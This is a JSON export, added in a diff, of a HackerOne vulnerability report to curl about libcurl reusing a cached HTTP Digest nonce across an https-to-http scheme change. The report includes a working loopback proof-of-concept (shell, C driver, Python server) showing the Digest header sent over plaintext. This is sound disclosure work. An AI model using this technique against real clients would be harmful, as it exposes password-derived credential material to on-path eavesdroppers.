@@ -1,0 +1,109 @@
+{
+  "id": 3993973,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTkzOTcz",
+  "url": "https://hackerone.com/reports/3993973",
+  "title": "HTTP Digest nonce reused across an https→http scheme change on the same handle",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "low",
+  "readable_substate": "Informative",
+  "created_at": "2026-09-03T16:27:30.385Z",
+  "submitted_at": "2026-09-03T16:27:30.636Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "giant_anteater",
+    "url": "/giant_anteater",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/r9sgcvqgyzx7oyd4vqjv580xuk4y/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-09-08T06:14:34.390Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-09-05T20:54:59.127Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi all,\n\nLast one from my side. Looks like https://hackerone.com/reports/3793260 was not patched completely correctly, and libcurl emit a live `Authorization: Digest` response (computed from a nonce/realm it only ever received over TLS) preemptively over plaintext HTTP, on a reused easy handle that switches from `https://host:port` to `http://host:port`. Wasn't sure whether this one, considering the .. unique circumstances that would require it to be hit .. would be best reported here or just as an issue on github, but considering the previous HN submission, thought here might be appropriate.\n\n## The bug\n\n`Curl_output_digest()` decides whether to keep or flush the cached Digest state before building the header:\n\n```c\n// lib/http_digest.c:38-62\nstatic void digest_flush_stale(struct Curl_easy *data,\n                               struct digestdata *digest,\n                               struct Curl_peer *peer,\n                               struct Curl_creds *creds)\n{\n  bool flush = FALSE;\n  if(digest->origin && !Curl_peer_same_destination(peer, digest->origin)) {\n    ...\n    flush = TRUE;\n  }\n  else if(digest->creds && !Curl_creds_same(creds, digest->creds)) {\n    ...\n    flush = TRUE;\n  }\n  if(flush)\n    Curl_auth_digest_cleanup(digest);\n\n  Curl_peer_link(&digest->origin, peer);\n  Curl_creds_link(&digest->creds, creds);\n}\n```\n\n`Curl_peer_same_destination()` (`lib/peer.c:340-348`) compares hostname, port, scopeid and zoneid — no scheme. A handle that did Digest auth against `https://host:port` and is then pointed at `http://host:port` looks like \"the same destination\" here, so the cached nonce survives.\n\nThe credentials-reuse gate doesn't catch it either: `Curl_http_output_auth()` short-circuits on `data->state.creds` (`lib/http.c:844`) before it ever reaches the scheme-aware `Curl_auth_allowed_to_origin()` / `Curl_peer_equal()` (`lib/peer.c:324`) path. If the app sets the same username/password for the http request, `data->state.creds` is non-NULL and the scheme-aware check is skipped.\n\nWith the nonce still cached, `have_chlg = !!digest->nonce` (`lib/http_digest.c:157`) is true, so the Digest response goes out on the first request of the http transfer, before that server has issued any challenge of its own.\n\n## Where it came from\n\n`digest_flush_stale()` was added in [`5c6b4880357a`](https://github.com/curl/curl/commit/5c6b4880357ab3e72967c1c45cae0f96ffabc535) — \"digest: flush state on origin or credential change\" (PR [#21944](https://github.com/curl/curl/pull/21944), 2026-06-10) specifically to stop Digest state leaking across origin changes, verified by `test1686`. That test covers a hostname change (`first.test` → `second.test`) and a credential change, both of which work correctly. It never covers a same-host **scheme** change, which is the one case `Curl_peer_same_destination()` doesn't catch, so the fix has a real gap in exactly the dimension its own name promises to handle.\n\n## PoC\n\nThe PoC reuses one easy handle: an https transfer with `alice:secret` (caches the nonce), then an http transfer to the same host:port. A loopback server peeks the first byte of each connection to route TLS vs. plaintext, and records whether a plaintext request already carries `Authorization: Digest`.\n\n```sh\n#!/bin/sh\n# Usage:\n#   ./run.sh exploit   # same creds on both transfers -> nonce reused -> LEAK\n#   ./run.sh control   # different creds on 2nd xfer   -> flushed     -> no leak\nset -e\nMODE=\"${1:-exploit}\"\nPORT=\"${PORT:-18443}\"\nRUNDIR=\"${TMPDIR:-/tmp}/digest-scheme-poc-$$\"\nCERT=\"$RUNDIR/cert.pem\"\nKEY=\"$RUNDIR/key.pem\"\nMARKER=\"$RUNDIR/leak-marker\"\nREADY=\"$RUNDIR/srv-ready\"\nmkdir -p \"$RUNDIR\"\ncleanup() {\n  [ -n \"$SRV\" ] && { kill \"$SRV\" 2>/dev/null; wait \"$SRV\" 2>/dev/null || true; }\n  rm -rf \"$RUNDIR\"\n}\n\nopenssl req -x509 -newkey rsa:2048 -keyout \"$KEY\" -out \"$CERT\" \\\n  -days 3650 -nodes -subj \"/CN=127.0.0.1\" >/dev/null 2>&1\n\ncat > \"$RUNDIR/drv.c\" <<'C'\n#include <curl/curl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nstatic size_t wr(void *p, size_t s, size_t n, void *u) {\n  (void)p; (void)u;\n  return s * n;\n}\n\nint main(int argc, char **argv) {\n  const char *mode = (argc > 1) ? argv[1] : \"exploit\";\n  const char *port = getenv(\"PORT\");\n  if (!port) port = \"18443\";\n  char hs[256], hp[256];\n  snprintf(hs, sizeof hs, \"https://127.0.0.1:%s/\", port);\n  snprintf(hp, sizeof hp, \"http://127.0.0.1:%s/\", port);\n\n  curl_global_init(CURL_GLOBAL_DEFAULT);\n  CURL *h = curl_easy_init();\n  curl_easy_setopt(h, CURLOPT_WRITEFUNCTION, wr);\n  curl_easy_setopt(h, CURLOPT_SSL_VERIFYPEER, 0L);\n  curl_easy_setopt(h, CURLOPT_SSL_VERIFYHOST, 0L);\n  curl_easy_setopt(h, CURLOPT_HTTPAUTH, (long)CURLAUTH_DIGEST);\n\n  /* transfer 1: https, obtains and caches the Digest nonce */\n  curl_easy_setopt(h, CURLOPT_URL, hs);\n  curl_easy_setopt(h, CURLOPT_USERPWD, \"alice:secret\");\n  CURLcode r1 = curl_easy_perform(h);\n  fprintf(stderr, \"== transfer1 https: %s\\n\", curl_easy_strerror(r1));\n\n  /* transfer 2: plaintext http, same handle, same host:port */\n  curl_easy_setopt(h, CURLOPT_URL, hp);\n  if (strcmp(mode, \"control\") == 0)\n    curl_easy_setopt(h, CURLOPT_USERPWD, \"bob:different\"); /* creds differ -> flush -> no leak */\n  else\n    curl_easy_setopt(h, CURLOPT_USERPWD, \"alice:secret\");  /* same creds -> stale nonce reused -> leak */\n  CURLcode r2 = curl_easy_perform(h);\n  fprintf(stderr, \"== transfer2 http: %s\\n\", curl_easy_strerror(r2));\n\n  curl_easy_cleanup(h);\n  curl_global_cleanup();\n  return 0;\n}\nC\n\ncat > \"$RUNDIR/server.py\" <<'PY'\nimport socket, ssl, os, sys, threading\n\nPORT = int(os.environ[\"PORT\"])\nCERT = os.environ[\"CERT\"]\nKEY = os.environ[\"KEY\"]\nMARKER = os.environ[\"MARKER\"]\nREADY = os.environ[\"READY\"]\n\ndef read_req(rf):\n    line = rf.readline()\n    if not line:\n        return None, \"\"\n    hdrs = b\"\"\n    while True:\n        h = rf.readline()\n        if h in (b\"\\r\\n\", b\"\\n\", b\"\"):\n            break\n        hdrs += h\n    return line, hdrs.decode(\"latin1\")\n\ndef handle_tls(conn):\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\n    ctx.load_cert_chain(CERT, KEY)\n    try:\n        s = ctx.wrap_socket(conn, server_side=True)\n    except Exception as e:\n        sys.stderr.write(\"tls handshake failed: %r\\n\" % e)\n        return\n    rf = s.makefile(\"rb\")\n    while True:\n        line, hdrs = read_req(rf)\n        if line is None:\n            break\n        if \"authorization:\" in hdrs.lower():\n            body = b\"OK\\n\"\n            s.sendall(b\"HTTP/1.1 200 OK\\r\\nContent-Length: %d\\r\\nConnection: keep-alive\\r\\n\\r\\n%s\"\n                      % (len(body), body))\n        else:\n            chal = b'Digest realm=\"testrealm\", nonce=\"deadbeefcafe1234\", qop=\"auth\"'\n            s.sendall(b\"HTTP/1.1 401 Unauthorized\\r\\nWWW-Authenticate: %s\\r\\n\"\n                      b\"Content-Length: 0\\r\\nConnection: keep-alive\\r\\n\\r\\n\" % chal)\n    try:\n        s.close()\n    except Exception:\n        pass\n\ndef handle_plain(conn):\n    rf = conn.makefile(\"rb\")\n    line, hdrs = read_req(rf)\n    if \"authorization: digest\" in hdrs.lower():\n        with open(MARKER, \"w\") as f:\n            f.write((line or b\"\").decode(\"latin1\", \"replace\") + hdrs)\n        sys.stderr.write(\"PLAINTEXT LEAK: client sent Authorization: Digest over http \"\n                          \"before any challenge\\n\")\n    body = b\"OK\\n\"\n    try:\n        conn.sendall(b\"HTTP/1.1 200 OK\\r\\nContent-Length: %d\\r\\nConnection: close\\r\\n\\r\\n%s\"\n                     % (len(body), body))\n    except Exception:\n        pass\n    try:\n        conn.close()\n    except Exception:\n        pass\n\ndef main():\n    l = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    l.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    l.bind((\"127.0.0.1\", PORT))\n    l.listen(16)\n    open(READY, \"w\").close()\n    while True:\n        conn, _ = l.accept()\n        try:\n            first = conn.recv(1, socket.MSG_PEEK)\n        except Exception:\n            conn.close()\n            continue\n        target = handle_tls if first == b\"\\x16\" else handle_plain\n        threading.Thread(target=target, args=(conn,), daemon=True).start()\n\nmain()\nPY\n\nCC=\"${CC:-cc}\"\nif command -v curl-config >/dev/null 2>&1; then\n  CURL_CFLAGS=\"$(curl-config --cflags)\"\n  CURL_LIBS=\"$(curl-config --libs)\"\nelse\n  CURL_CFLAGS=\"\"\n  CURL_LIBS=\"-lcurl\"\nfi\n\n\"$CC\" $CURL_CFLAGS \"$RUNDIR/drv.c\" $CURL_LIBS -o \"$RUNDIR/drv\"\n\nPORT=\"$PORT\" CERT=\"$CERT\" KEY=\"$KEY\" MARKER=\"$MARKER\" READY=\"$READY\" \\\n  python3 \"$RUNDIR/server.py\" 2>\"$RUNDIR/srv.log\" &\nSRV=$!\n\ni=0\nwhile [ ! -f \"$READY\" ]; do\n  i=$((i + 1))\n  [ \"$i\" -gt 200 ] && { echo \"server never came up\" >&2; cat \"$RUNDIR/srv.log\" >&2; cleanup; exit 1; }\n  sleep 0.05\ndone\n\nPORT=\"$PORT\" \"$RUNDIR/drv\" \"$MODE\" >\"$RUNDIR/drv.log\" 2>&1 || true\nsleep 0.3\n\necho \"---- driver output ----\"\ncat \"$RUNDIR/drv.log\"\necho \"---- server stderr ----\"\ncat \"$RUNDIR/srv.log\"\necho \"------------------------\"\n\nif [ -f \"$MARKER\" ]; then\n  echo \"RESULT: LEAK - plaintext http request carried Authorization: Digest before any challenge\"\n  echo \"captured request line + headers:\"\n  sed 's/^/    /' \"$MARKER\"\n  rc=1\nelse\n  echo \"RESULT: no leak observed\"\n  rc=0\nfi\n\ncleanup\nexit \"$rc\"\n```\n\nRun as `exploit`, the plaintext server's very first request already carries the header, before any 401:\n\n```\nGET / HTTP/1.1\nHost: 127.0.0.1:18443\nAuthorization: Digest username=\"alice\", realm=\"testrealm\", nonce=\"deadbeefcafe1234\", uri=\"/\", cnonce=\"...\", nc=00000002, qop=auth, response=\"...\"\n```\n\n`control` (second `CURLOPT_USERPWD` set to `bob:different`) hits `Curl_creds_same()`, flushes, and sends no `Authorization` header on the first plaintext request — same code path, same host:port, only the credential match/mismatch differs.\n\n## Suggested direction\n\nSwap `Curl_peer_same_destination()` for the already scheme-aware `Curl_peer_equal()` (`lib/peer.c:324`) at `lib/http_digest.c:44`, or add an explicit scheme comparison there, so a scheme change on the same host:port always flushes cached Digest state regardless of credential match. Probably worth extending `test1686` with a same-host scheme-downgrade case, since that's the gap the existing test doesn't cover.\n\nThank you,\nJosh\n\n## Impact\n\nAn on-path attacker who can only observe the plaintext http leg a Digest response (`MD5(HA1, nonce, HA2, ...)`, keyed on the actual password tied to a challenge their own server never issued, sent preemptively rather than earned.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 1,
+  "voters": [
+    "bugsatti"
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
